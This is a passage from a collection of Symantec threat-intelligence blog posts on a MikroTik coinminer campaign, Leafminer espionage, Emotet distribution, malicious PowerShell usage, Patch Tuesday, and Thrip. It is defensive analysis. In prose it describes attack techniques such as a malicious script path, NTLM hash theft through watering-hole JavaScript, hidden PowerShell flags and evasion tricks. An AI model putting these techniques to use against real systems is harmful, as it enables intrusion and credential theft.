    "content": "Cryptocurrency coinminers are the new ransomware and malicious actors have already pounced on the opportunity to make their fortune. Symantec has beentrackinga large-scale coin-mining campaign which, as per Shodan, has currently infected about 157,000 MikroTik routers. Researchers discovered this coin-mining campaign in early August 2018. The campaign was initially concentrated in Brazil; however, it soon began infecting routers around the world. I decided to take a closer look at one of these infected routers to get a better understanding at what’s going on. At the outset, the compromised router has multiple services running on it. Interestingly, the infected router had the default web service disabled. Pointing a browser to the infected router’s port 80, causes it to serve the Coinhive script responsible for coin mining (Figure 2). But when the infected router is found in between a client sending a request and a server receiving it, this HTML page is only served when there’s an error. This is because internally the router is configured with a firewall rule that helps serve this malicious HTML page. Using network address translation (NAT), the firewall rule takes traffic bound to port 80and redirects it to port 8080 (Figure 3). The router is also configured to run a default proxy server on port 8080that’s responsible for serving the Coinhive script. Looking at the webproxypath,we can find the actual file (error.html)that holds the coin-mining script that’s served every time there’s an error. The error.html file is available from the following path: /webproxy/error.html When the router is compromised, the hackers schedule multiple scripts to run at various times. These scheduled scripts are created to download the error.htmlpage onto the router, which allows the hackers to drop various versions of the error.html page if they wish. These scheduled jobs are set up by another script which is executed on the compromised router during the initial stages of infection. This script is hosted on the min01.com/01/a113.rsc server, as seen in Figure 6. This script is responsible for performing multiple malicious actions on the router including, but not limited to: It’s likely that this script was downloaded using the inbuilt/tool fetchcommand and run using the/importcommand. All of the infected MikroTik routers (v6.29 to v6.42) that I encountered were running the Winboxservice, which is known to be vulnerable toCVE-2018-14847. When exploited successfully, this flaw can allow an attacker to bypass authentication and compromise the router. After the router is compromised, the hackers can load their malicious error page, which is displayed any time a user accessing the internet via the router encounters an HTTP error. Every time the error page is displayed, the victim is unknowingly mining Monero (XMR) for the hackers. These routers are used by many organizations and businesses, including internet service providers. While MikroTik was prompt in patching CVE-2018-14847, unfortunately poor patching practices by vendors and users mean that there are plenty of vulnerable routers still out there. The following Symantec intrusion prevention system (IPS) detections blocked this coin-mining campaign from day one: Figure 7 shows Symantec IPS detections protecting users from this coin-mining campaign. MikroTik has already published a patch to address CVE-2018-14847. Symantec recommends users to install the patch on their routers, if they have not done so already. Users can also consider disabling the following services on their routers, if not required: Karthikeyan is a member of Symantec’s Security Technology and Response team which is focused on providing round-the-clock protection against current and future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/hacked-mikrotik-router"
  },
  {
    "title": "leafminer espionage middle east",
    "content": "Symantec has uncovered the operations of a threat actor named Leafminer that is targeting a broad list of government organizations and business verticals in various regions in the Middle East since at least early 2017. The group tends to adapt publicly available techniques and tools for their attacks and experiments with published proof-of-concept exploits. Leafminer attempts to infiltrate target networks through various means of intrusion: watering hole websites, vulnerability scans of network services on the internet, and brute-force/dictionary login attempts. The actor’s post-compromise toolkit suggests that the group is looking for email data, files, and database servers on compromised target systems. During our investigation, there was a breakthrough discovery that helped connect Leafminer to a number of attacks observed on systems in the Middle East and identify the toolkit used in the group’s efforts of intrusion, lateral movement, and exfiltration. The download URL for a malware payload used in one of the attacks lead to the identification of a compromised web server on the domain e-qht.az that had been used to distribute Leafminer’s arsenal of malware, payloads, and tools within the group and make them available for download from victim machines. As of early June 2018, the server hosted 112 files in a subdirectory that could be accessed through a public web shell planted by the attackers. In addition to malware and tools, the served files also included uploads of log files seemingly originating from vulnerability scans and post-compromise tools. The web shell is a modification of the PhpSpy backdoor and references the author MagicCoder while linking to the (deleted) domain magiccoder.ir. Researching the hacker handle MagicCoder results in references to the Iranian hacking forum Ashiyane as well as defacements by the Iranian hacker group Sun Army. During the investigation of the Leafminer group, we were able to assemble a targeting profile from different sources including telemetry and log files hosted publicly on the attacker’s arsenal server. One interesting source of target information discovered during the Leafminer investigation was a list of 809 targets used by the attackers for vulnerability scans. Symantec detection telemetry shows malware and custom tools used by Leafminer on 44 systems across four regions in the Middle East. One interesting source of target information discovered during the Leafminer investigation was a list of 809 targets used by the attackers for vulnerability scans. The list is written in the Iranian language Farsi and groups each entry with organization of interest by geography and industry. Figure 3 shows a breakdown of the industry verticals. Targeted regions included in the list are Saudi Arabia, United Arab Emirates, Qatar, Kuwait, Bahrain, Egypt, Israel, and Afghanistan. We observed three main techniques used by Leafminer for initial intrusion of target networks: There are indicators that suggest the attackers have also employed email phishing with malicious attachment files. However, this was not directly observed or captured. Our investigation of Leafminer started with the discovery of JavaScript code on several compromised websites in the Middle East. The obfuscated code was planted by the attackers to steal SMB credential hashes that could subsequently be brute-forced offline. When executing the code, the browser creates an invisible image tag and sets the URL to an attack server using the file:// protocol scheme. On Windows machines, this triggers a request to a remote server via the Samba networking protocol (SMB) that also transmits the user’s login NTLM hash. These hashes can be cracked to retrieve the original login password by methods of brute-force, dictionary, or rainbow table lookups. Table 1 shows an overview of the compromised websites used as watering holes, infected JavaScript URLs, and SMB URLs used to collect NTLM hashes. Interestingly, the same technique was also observed in watering hole attacks by the threat actorDragonfly in 2017 as reported by Symantec. As previously mentioned, Leafminer seems to be actively following developments and publications of the offensive security community when selecting their toolkit. This became especially apparent when analyzing the group’s techniques and tools for vulnerability scans and exploitation. The compromised web server used to store Leafminer’s arsenal hosted several public proof-of-concept exploits and exploitation tools. This included the Fuzzbunch framework that was part of an infamous leak of exploits and tools by the Shadow Brokers in April 2017. Leafminer has developed exploit payloads for this framework (Table 2) that deliver custom malware through attacks against SMB vulnerabilitiesdescribed by Microsoft. The EternalBlue exploit from the framework received worldwide attention after being used in the ransomware campaignsWannaCryin May andPetya/NotPetyain June 2017. The Leafminer operators use EternalBlue to attempt lateral movement within target networks from compromised staging servers. Symantec also observed attempts by Leafminer to scan for theHeartbleedvulnerability (CVE-2014-0160) from an attacker-controlled IP address. Furthermore, the Leafminer arsenal server hosted a Python script to scan for this vulnerability. Another intrusion approach used by Leafminer seems a lot less sophisticated than the previously described methods but can be just as effective: using specific hacktools to guess the login passwords for services exposed by a targeted system. This type of attack was observed both via dedicated servers set up by Leafminer as well as staging servers compromised by the group. Commands found in a readme text that was stored in a ZIP archive together with the hacktool THC Hydra in Leafminer’s tool arsenal represent online dictionary attacks on Microsoft Exchange and Remote Desktop Protocol services of regional government servers in Saudi Arabia. \"Online\" in this case refers to the attacker using the protocol of the targeted network service to quickly run through many password guesses. Symantec identified two strains of custom malware used by the Leafminer group:Trojan.ImecabandBackdoor.Sorgu. Directly connected to this malware are several sets of reflective loader DLLs used as droppers or to execute specific commands on a compromised system. The development of custom malware by Leafminer as well as some of the tools used for lateral movement show a preference for the .NET framework. We also observed that the attackers would download and install the .NET framework on compromised machines, supposedly in the situation that an operator would have remote access to the system but required .NET to run Leafminer's custom tools. To this end, the command and control (C&C) server operated by the group hosted the legitimate setup executable for Microsoft .NET Framework 2.0 SP2. Backdoor.Sorgu is used by the attackers to provide remote access to the infected machine. The backdoor is installed as a service in the Windows system through a shell command script. The purpose of Trojan.Imecab is to set up a persistent remote access account on the target machine with a hardcoded password. Variants of the malware were also observed with the filename guester.exe which likely refers to the functionality of adding a powerful guest account to the system. The malware installs itself in the system as a Windows service to achieve persistence and ensure that the guest account remains available to the attacker. Table 2 gives an overview of the reflective loader DLLs and their purpose: These DLLs were likely used as payloads for exploit shellcode of the Fuzzbunch framework, which is also evidenced by the embedded PDB strings. The discovery of malware and hacktools hosted on e-qht.az allowed us to correlate detection telemetry of potential Leafminer intrusions with tools made available for download to the group’s operators. Understanding the purpose of the tools used by the attacker gives a unique insight into the tactics and procedures used by Leafminer after the initial compromise of a target network. Table 3 outlines the observed toolset for lateral movement, information gathering, and exfiltration. We discovered a number of servers compromised by Leafminer that were used as staging systems to gain a foothold in the targeted network and execute attacks on intranet resources. For example, the use of THC Hydra to execute dictionary attacks against Exchange logins was observed both in initial intrusion attempts as well as in lateral attacks from staging systems. Figure 4 shows a screenshot of the Total SMB BruteForcer hacktool used by Leafminer for lateral movement. The tool requires input files with lists of IPs, users, and passwords respectively. The arsenal server hosted five text files that could be used by Leafminer operators as input for dictionary attacks using Total SMB Bruteforcer and THC Hydra. One of the custom tools used by the Leafminer group is a rebranded version of the widespread post-exploitation tool Mimikatz. While the logo and commands are identical to the original hacktool, the name was changed to OrangeTeghal. To evade security software while deploying this tool on compromised systems, the attackers use a technique revealed at Black Hat EU ‘17 in the presentationLost in Transaction: Process Doppelgänging. The malware file orange64.exe is a .NET executable that drops and executes a PowerShell script with basic obfuscation. After deobfuscation, this script closely resembles the code published by the authors of the technique. Process Doppelgänging uses NTFS transactions to modify the executable of a seemingly benign process that is suspended right after creation. Leafminer is a highly active group, responsible for targeting a range of organizations across the Middle East. The group appears to be based in Iran and seems to be eager to learn from and capitalize on tools and techniques used by more advanced threat actors. On a broad level, it has followed the recent trend among targeted attack groups for “living off the land”—using a mixture of publicly available tools alongside its own custom malware. More specifically, it mimicked Dragonfly’s use of a watering hole to harvest network credentials. It also capitalized on the Shadow Brokers release ofInception Frameworktools, making use of the leaked Fuzzbunch framework by developing its own exploit payloads for it. Leafminer’s eagerness to learn from others suggests some inexperience on the part of the attackers, a conclusion that’s supported by the group’s poor operational security. Leafminer has also been tracking developments in the world of cyber security. After the Heartbleed bug was disclosed it began scanning for instances of the vulnerability. It also utilized Process Doppelgänging, a detection evasion technique first discussed at the Black Hat EU conference last year. However, Leafminer’s eagerness to learn from others suggests some inexperience on the part of the attackers, a conclusion that’s supported by the group’s poor operational security. It made a major blunder in leaving a staging server publicly accessible, exposing the group’s entire arsenal of tools. That one misstep provided us with a valuable trove of intelligence to help us better defend our customers against further Leafminer attacks. Symantec has the following protections in place to protect customers against Leafminer attacks: File-based protection Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received intelligence that details the characteristics of the Leafminer cyber espionage group and methods of detecting and thwarting activities of this adversary. Symantec has also developed a list of Indicators of Compromise to assist in identifying Leafminer activity: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. Network Protection Security Labs is a group of security experts within Network Protection Products doing advanced security research to continuously improve Symantec Network Products. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/leafminer-espionage-middle-east"
  },
  {
    "title": "evolution emotet trojan distributor",
    "content": "Mealybug is a cyber crime actor that has been active since at least 2014. It is identified by its use of its custom malware,Trojan.Emotet. It appears to have changed its business model in recent times, evolving from targeting banking customers in Europe to using its infrastructure to act as a global packing and delivery service for other threat actors. Because it can self-propagate, Emotet presents a particular challenge for organizations. Network worms have been experiencing a kind of renaissance, with notable examples like WannaCry (Ransom.Wannacry) and Petya/NotPetya (Ransom.Petya). Network spreading also means that victims can become infected without ever clicking on a malicious link or downloading a malicious attachment. Once on a computer, Emotet downloads and executes a spreader module that contains a password list that it uses to attempt to brute force access to other machines on the same network. Emotet’s method of self-propagation—brute forcing passwords—has additional potential to cause major headaches for organizations as it may result in multiple failed login attempts, which can lead to users becoming locked out of their network accounts. This has the knock-on effect of increased calls to IT helpdesks and general loss of productivity. This was a hallmark of the notorious Conficker (W32.Downadup) threat and, 10 years later, threats continue to cause similar problems. As well as brute forcing passwords, Emotet can also spread to additional computers using a spam module that it installs on infected victim machines. This module generates emails that use standard social engineering techniques and typically contain subject lines including words such as “Invoice”. Some subject lines include the name of the person whose email account has been compromised, to make it seem less like a spam email. The emails typically contain a malicious link or attachment which if launched will result in them becoming infected with Trojan.Emotet. Most recently, Mealybug appears to have expanded its operations to primarily become a distributor of threats for other attack groups. When Mealybug was first identified in 2014 it was using Emotet to spread banking Trojans, and was focused on targeting banking customers in Germany. At the time, Mealybug was using Trojan.Emotet as the loader portion ofW32.Cridex.B, a rewritten version of the Cridex banking Trojan. In 2015, Mealybug started targeting Swiss banking customers as well and evolved Emotet into more modular malware. The new version of Emotet had separate modules for its loader, banking data theft, email login theft, distributed denial of service (DDoS) attacks, and malicious spam. Mealybug has primarily been engaged in using Emotet for the delivery of banking Trojans, and in 2017 it was the first group to deliver the IcedID (Trojan.IcedID) banking Trojan. However, also in 2017, it was observed delivering theTrojan.TrickybotandRansom.UmbreCryptransomware.  Mealybug has developed its capabilities over the years and now appears to offer an “end-to-end” service for delivery of threats. It delivers the threats, obfuscates them to reduce the chances of detection, and provides a spreader module that allows the threats to self-propagate. Emotet gets an initial foothold on a victim machine or network by sending an email containing either a malicious link that leads to a downloader document or that has a malicious document attached. Anti-analysis tactics have been present in Emotet since at least 2015 and, in 2018, Emotet’s payload consists of a packed file containing the main component and an anti-analysis module. The anti-analysis module performs multiple checks to ensure it is not being run on a malware research machine, then loads the main component. Either PowerShell or JavaScript is used to download the Trojan, which delivers a packed payload file to the victim machine. Once on a machine, the latest version of Emotet: It can then download any new payloads from the C&C server, and execute them. Emotet can download an updated version of itself, or any other threat. Existing versions of Emotet download modules from the C&C server that include: According to Symantec telemetry for the first half of 2018, its focus now is mainly on targets in the U.S. All information stolen by these modules is sent to the C&C server. Emotet also has a DDoS module that can add the infected machine to a botnet to carry out DDoS attacks. Emotet’s geographic targets have also increased significantly over the years. After a relatively quiet period since 2015, detections of Emotet surged in the second half of 2017, and in that year Mealybug’s targets included victims in Canada, China, the UK, and Mexico. However, according to Symantec telemetry for the first half of 2018, its focus now is mainly on targets in the U.S. Since February 2018, Emotet has been used to spreadW32.Qakbot, a family of banking Trojans known for behaving like network worms. Like Emotet, Qakbot can self-propagate. Qakbot attempts brute force access to spread across networks and also uses “living-off-the-land” tools to propagate. It uses PowerShell to download and run Mimikatz (Hacktool.Mimikatz), an open-source credential stealing tool that allows attackers to move rapidly across a network once they have established an initial foothold. The fact that both Emotet and Qakbot have self-spreading capabilities mean that once these threats get onto your network they can spread aggressively. The fact that both attempt brute force access to spread across networks also increases the risk of users being locked out of their devices. A spike in Qakbot detections in February 2018 indicates that “double-spreading” of the threat was taking place, meaning that Mealybug was using Emotet to spread Qakbot across networks, while Qakbot was simultaneously using its own self-spreading capabilities. The account lockout scenario is a very real danger, and a potential major headache for organizations. Symantec analysis shows that Emotet and Qakbot are packed with the same packer, but there are multiple factors that suggest Mealybug is only providing Emotet as a delivery service for the actors behind Qakbot, and is not controlling the Trojan. There does not appear to be any overlap between the C&C infrastructure of the two Trojans, and analysis also revealed differences in the code of their main components and in their anti-debugging techniques. Mealybug using two different spreading mechanisms is also surprising because, as mentioned above, both Trojans attempting to brute force passwords could trigger account lockouts and stop the Trojans from spreading. It is unlikely Mealybug would use the two different spreading techniques if it was controlling both Trojans. For these reasons we believe Emotet and Qakbot are controlled by two separate groups, and that Mealybug is offering Emotet as a delivery mechanism for other threats. Mealybug seems to have found its niche as a provider of delivery services for other threats. The main component of Trojan.Emotet functions as a loader, and can theoretically support any payload. While it is still primarily known for distributing banking Trojans, it can in theory spread any threat, and there have been reports of it distributing the Ransom.UmbreCrypt ransomware. Mealybug presumably makes its money by taking a cut of the profits made by the threat actors who use its services. From what we can see, Mealybug appears to be operating for more than one attack group at a time, so we have no evidence that it offers itself as an “exclusive” distributor. In November 2017, Mealybug was observed delivering the Trojan.Trickybot and W32.Qakbot threats simultaneously onto the same machine in a few instances, and in one case within a few minutes. Mealybug’s shift from distributing its own banking Trojan to a relatively small number of targets, to acting primarily as a global distributor of other groups’ threats is interesting, and backs up an observation we made inthe ISTRthat threat actors are evolving and refining their techniques and business model to maximize profits. In the ISTR we outlined how some threat actors appeared to be turning to coin mining as it became hugely profitable due to the rise in the value of cryptocurrencies. It appears Mealybug has decided that it can best maximize its returns through taking a role as distributor. It may be that Mealybug was finding it harder to make money exclusively from banking Trojans so it had to change its approach. The growth in popularity and use by banks of two-factor authentication (2FA) has made it more difficult to compromise accounts by stealing credentials, and awareness and protection has improved as online banking has matured. Mealybug activity presents a number of challenges for organizations, including: Symantec has had protection for Mealybug attacks since the initial identification of the group’s activities in 2014 and blocks such activities at every level of Mealybug’s attack chain. Macro downloader stage: Main module file stage: Main module loaded stage: C&C communication stage: Spam and stealer and spreader module stage: Emotet spreader infection stage: Targeted Attack Analytics Symantec’s newTargeted Attack Analytics (TAA), available inour ATP Productcan detect attacks where an executable spreads to multiple machines across a network via credential theft, brute forcing, or an exploit. TAA detects Emotet’s malicious activity due to patterns in its spreading behavior. In particular, TAA will detect when files are dropped by Emotet’s spreader module on multiple machines in an organization. Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received multiple reports on Emotet.  These reports detail methods of detecting and thwarting activities of the group that leverages this Trojan. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/evolution-emotet-trojan-distributor"
  },
  {
    "title": "powershell threats grow further and operate plain sight",
    "content": "The preinstalled and versatile Windows PowerShell has become one of the most popular choices in cyber criminals’ arsenals. We have observed an increase of 661 percent in computers where malicious PowerShell activity was blocked from the second half of 2017 to the first half of 2018—a clear indication that attackers are still growing the use of PowerShell in their attacks. Of course, it is not just a method seen with targeted attack groups, but also among common cyber criminals deploying financial Trojans or cryptocurrency miners. Especially for fileless attacks, where no file is written to disk, such PowerShell scripts have become very popular, as recently seen with theGhostMinerandBluwimpsworms that distribute coinminers directly in memory. The whole “living off the land” tactic, of which PowerShell is a part, is very popular these days. Dual-use tools such as WMI or PsExec, which are commonly seen during attacks, are another frequently observed aspect of this tactic. Attackers are constantly experimenting with scripts, learning, and sharing their experience among themselves. In addition, PowerShell frameworks such as PowerSploit or Empire have made it easy not only for penetration testers but also attackers to integrate malicious scripts into their toolset. We extensively discussed PowerShell threats in our December 2016white paper, and most of the analysis is still valid today. However, we wanted to see how much the malicious usage has changed since then. To get a better understanding of today’s landscape, we analyzed more than 115,000 randomly selected malicious PowerShell command lines that we saw in 2018. Many of them came from Microsoft Office documents or self-propagating worms. The first thing that caught our eye was that, even though there are many obfuscation tricks available for PowerShell and even automated tools that can obfuscate scripts for users, these are rarely used in the wild. Only four percent of the PowerShell command lines we analyzed tried to obfuscate themselves by using a mixture of lower- and uppercase letters. And even those that do are often auto-generated by some toolkit with a poor randomizer. The following are two examples that were embedded into Microsoft Office documents: Of course, the classical string rearranging with the “-f” function or string concatenation are also used in an attempt to fool simple pattern matching. In our test set, we saw it used by 3.2 percent of the samples: Isolated cases of other string manipulation or special characters like the tick do occur as well, but very rarely: Occasionally there are PowerShell scripts generated by frameworks such as Invoke-Obfuscation resulting in cryptic scripts which make use of ConvertTo-SecureString and SecureStringToGlobalAllocUnicode. Many attackers probably are not too concerned about obfuscation because they know that not everybody is monitoring PowerShell activity anyway. Even if the security personnel do, then a non-obfuscated command line might be more likely to slip unnoticed through the cracks. Too much obfuscation can be a red flag. Of course, another option for the attacker is to use a BASE64-encoded blob to hide their commands, resulting in an extra step of decoding required, before the payload can be seen. This is often done by all kinds of scripts, including benign ones. From all analyzed scripts, 5.7 percent used a BASE64-encoded string to hide their commands. With 80 percent of this subset of scripts, most simply used the built-in “-EncodedCommand” command line argument or a variation thereof to decode and run their commands. But some attackers used other commands to achieve the same results, as there are usually many ways to reach a goal with PowerShell: The most common command line parameters we observed are still “-NoP -NonI -W Hidden”. Although the arguments can be written in different ways, most attackers stick to the short version. Regardless of the typing, we see that they appear in about three out of four command lines. The ExecutionPolicy flag is not used that often, as it is not needed when only one command is executed by the script. From all analyzed scripts, 5.7 percent used a BASE64-encoded string to hide their commands. With 80 percent of this subset of scripts, most simply used the built-in “-EncodedCommand” command line argument or a variation thereof to decode and run their commands. Some attackers are quite upfront about their intentions. We regularly see attackers trying to download and invokeHacktool.Mimikatzor Meterpreter shell directly from open source code repositories without even trying to hide it, although they only make up less than half a percent. One of the main goals of most malicious PowerShell scripts is still to download and execute some remote payload. From all samples analyzed, 17 percent downloaded something through HTTP or HTTPS. The scripts are getting more robust and often try multiple URLs, use the local proxy settings, or set a specific user agent in order to succeed. However, the user agent is not always used to blend in by spoofing an installed browser or Office application. Some downloader threats use it to track different campaigns or prevent anyone from accidentally downloading the payload without the right password. For example, one very active PowerShell downloader often uses “USR-KL” or “USRUE-VNC” as user agent when downloading the next stage. But looking at other instances indicates that they do some granular tracking as well: “LL-Chrome”, “Linux-MK”, “CA_SKULL”, “US-SKULL”. They likely know that these strings are visible, and therefore sometimes have fun as well, e.g. “Rembo 20”, “TrumpOK 1.0.0”, “Breakthrough 1.0.0”. The number of computers where PowerShell commands were executed doubled from 734,262 in Q1 2018 to 1,451,449 in Q2 2018. In May 2018, we saw PowerShell scripts being executed on an average of 480,000 computers per day. Of course, not every invocation of PowerShell is malicious. As a matter of fact, the majority of cases are benign scripts and only 0.8 percent were malicious, but don’t let that fool you—the threat from malicious PowerShell is definitely increasing. The high number of PowerShell activity makes it obvious that you cannot just ban all PowerShell activity on a computer. At Symantec, we use the vast number of data to feed our various protection engines such as behavioral detection or advanced machine learning. With this telemetry data, we can then find previously unknown malicious scripts and stop them, without affecting the regular administration work on the system. The number of computers where PowerShell commands were executed doubled from 734,262 in Q1 2018 to 1,451,449 in Q2 2018. In May 2018, we saw PowerShell scripts being executed on an average of 480,000 computers per day. We see that PowerShell is still heavily used as part of the living off the land tactic for lateral movement, downloaders, and fileless threats. This trend is most likely to increase further in combination with dual-use tools. Most attackers don’t even try to hide their intention very much. Unfortunately, they often do not have to and are still successful since many system administrators do not monitor such activity. The attacker can hide in plain sight with all the benign PowerShell activity that occurs. One has to look carefully to spot the malicious activity with the naked eye. Now that Windows PowerShell officially has a built-in SSH client, we expect even more legitimate use of PowerShell on various systems and some malicious scripts misusing SSH too. Candid Wueest works for Symantec's Security Technology and Response (STAR) division. He analyzes new security threats, advises on mitigation strategies, and writes research reports on new emerging security trends such as threats to the Internet of Things. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/powershell-threats-grow-further-and-operate-plain-sight"
  },
  {
    "title": "microsoft patch tuesday july 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the July 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Scripting Engine Memory Corruption Vulnerability(CVE-2018-8242)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8275)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8279)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8280)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8283)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8286)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8288)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8290)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8291)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8294)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8296)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8298)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8262)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8274)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8301)MS Rating: Critical Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8324)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8287)MS Rating: Important Internet Explorer Security Bypass Vulnerability(CVE-2018-0949)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8289)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8297)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8125)MS Rating: Important Scripting Engine Security Bypass Vulnerability(CVE-2018-8276)MS Rating: Important Microsoft Edge Spoofing Vulnerability(CVE-2018-8278)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8325)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Office Remote Code Execution Vulnerability(CVE-2018-8281)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8299)MS Rating: Important Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2018-8300)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8323)MS Rating: Important Microsoft Access Remote Code Execution Use After Free Vulnerability(CVE-2018-8312)MS Rating: Important Microsoft Office Tampering Vulnerability(CVE-2018-8310)MS Rating: Low Cumulative Security Update for Microsoft .NET ASP.NET Core Security Bypass Vulnerability(CVE-2018-8171)MS Rating: Important .NET Framework Privilege Escalation Vulnerability(CVE-2018-8202)MS Rating: Important .NET Framework Remote Code Execution Vulnerability(CVE-2018-8260)MS Rating: Important .NET Framework Remote Code Injection Vulnerability(CVE-2018-8284)MS Rating: Important .NET Framework Security Bypass Vulnerability(CVE-2018-8356)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Win32k Privilege Escalation Vulnerability(CVE-2018-8282)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2018-8313)MS Rating: Important Windows Kernel Privilege Escalation Vulnerability(CVE-2018-8308)MS Rating: Important Cumulative Security Update for Microsoft Windows PowerShell Editor Services Remote Code Execution Vulnerability(CVE-2018-8327)MS Rating: Critical Visual Studio Remote Code Execution Vulnerability(CVE-2018-8172)MS Rating: Important Skype for Business and Lync Security Bypass Vulnerability(CVE-2018-8238)MS Rating: Important Remote Code Execution Vulnerability in Skype For Business and Lync(CVE-2018-8311)MS Rating: Important Windows FTP Server Denial of Service Vulnerability(CVE-2018-8206)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8222)MS Rating: Important Microsoft Macro Assembler Tampering Vulnerability(CVE-2018-8232)MS Rating: Moderate Windows DNSAPI Denial of Service Vulnerability(CVE-2018-8304)MS Rating: Important Windows Mail Client Information Disclosure Vulnerability(CVE-2018-8305)MS Rating: Important Microsoft Wireless Display Adapter Command Injection Vulnerability(CVE-2018-8306)MS Rating: Important WordPad Security Bypass Vulnerability(CVE-2018-8307)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2018-8309)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2018-8314)MS Rating: Important MSR JavaScript Cryptography Library Security Bypass Vulnerability(CVE-2018-8319)MS Rating: Important Open Source Customization for Active Directory Federation Services XSS Vulnerability(CVE-2018-8326)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Himanshu is a senior member of Symantec's Cyber Security Services organization. An active contributor to numerous security communities, he frequently provides insight on vulnerabilities and shares his knowledge by writing reports, blogs, and journals. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-july-2018"
  },
  {
    "title": "thrip hits satellite telecoms defense targets",
    "content": "One of the most significant developments in cyber espionage in recent years has been the number of groups adopting “living off the land” tactics. That’s our shorthand for the use of operating system features or legitimate network administration tools to compromise victims’ networks. The purpose of living off the land is twofold. By using such features and tools, attackers are hoping to blend in on the victim’s network and hide their activity in a sea of legitimate processes. Secondly, even if malicious activity involving these tools is detected, it can make it harder to attribute attacks. If everyone is using similar tools, it’s more difficult to distinguish one group from another. Most attack groups do still create and leverage custom malware, but it tends to be employed sparingly, reducing the risk of discovery. This doesn’t mean espionage attacks are now going undiscovered, but it does mean that they can take longer for analysts to investigate. This is one of the reasons why Symantec createdTargeted Attack Analytics (TAA), which takes tools and capabilities that we’ve developed for our own analysts and makes them available to our Advanced Threat Protection (ATP) customers. TAA leverages advanced artificial intelligence and machine learning that combs through Symantec’s data lake of telemetry in order to spot patterns associated with targeted attacks. Its advanced AI automates what previously would have taken thousands of hours of analyst time. This makes it far easier for us, and for our customers, to find that “needle in the haystack.” It was TAA that led us to the latest cyber espionage campaign we’ve uncovered. Back in January 2018, TAA triggered an alert at a large telecoms operator in Southeast Asia. An attacker was using PsExec to move laterally between computers on the company’s network. PsExec is a Microsoft Sysinternals tool for executing processes on other systems and is one of the most frequently seen legitimate pieces of software used by attackers attempting to live off the land. However, it’s also widely used for legitimate purposes, meaning malicious use of PsExec can be difficult to spot. TAA not only flagged this malicious use of PsExec, it also told us what the attackers were using it for. They were attempting to remotely install a previously unknown piece of malware (Infostealer.Catchamas) on computers within the victim’s network. Armed with this information about the malware and living off the land tactics being used by this group of attackers whom we named Thrip, we broadened our search to see if we could find similar patterns that indicated Thrip had been targeting other organizations. We uncovered a wide-ranging cyber espionage campaign involving powerful malware being used against targets that are a cause for concern. We identified three computers in China being used to launch the Thrip attacks. Thrip’s motive is likely espionage and its targets include those in the communications, geospatial imaging, and defense sectors, both in the United States and Southeast Asia. Perhaps the most worrying discovery we made was that Thrip had targeted a satellite communications operator. The attack group seemed to be particularly interested in the operational side of the company, looking for and infecting computers running software that monitors and controls satellites. This suggests to us that Thrip’s motives go beyond spying and may also include disruption. Another target was an organization involved in geospatial imaging and mapping. Again, Thrip seemed to be mainly interested in the operational side of the company. It targeted computers running MapXtreme Geographic Information System (GIS) software which is used for tasks such as developing custom geospatial applications or integrating location-based data into other applications. It also targeted machines running Google Earth Server and Garmin imaging software. The satellite operator wasn’t the only communications target Thrip was interested in. The group had also targeted three different telecoms operators, all based in Southeast Asia. In all cases, based on the nature of the computers infected by Thrip, it appeared that the telecoms companies themselves and not their customers were the targets of these attacks. In addition, there was a fourth target of interest, a defense contractor. Thrip uses a mixture of custom malware and living off the land tools to perform its attacks. The latter include: All of these tools, with the exception of Mimikatz (which is almost always used maliciously), have legitimate uses. For example, PowerShell is widely used within enterprises and the vast majority of 